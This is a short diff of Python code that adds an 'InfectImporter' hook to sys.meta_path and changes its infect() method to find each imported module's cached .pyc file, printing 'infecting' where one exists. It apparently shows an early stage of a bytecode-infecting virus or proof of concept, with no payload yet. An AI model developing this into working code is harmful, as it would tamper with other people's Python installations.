@@ -1,5 +1,6 @@
 import sys
-from importlib.util import find_spec
+import os.path
+from importlib.util import find_spec, cache_from_source
 
 
 class InfectImporter():
@@ -16,7 +17,10 @@ class InfectImporter():
         return None
 
     def infect(self, filename):
-        print("infect ", filename)
+        if filename:
+            pyc_filename = cache_from_source(filename)
+            if os.path.exists(pyc_filename):
+                print("infecting", filename)
 
 
 sys.meta_path = [InfectImporter()] + sys.meta_path
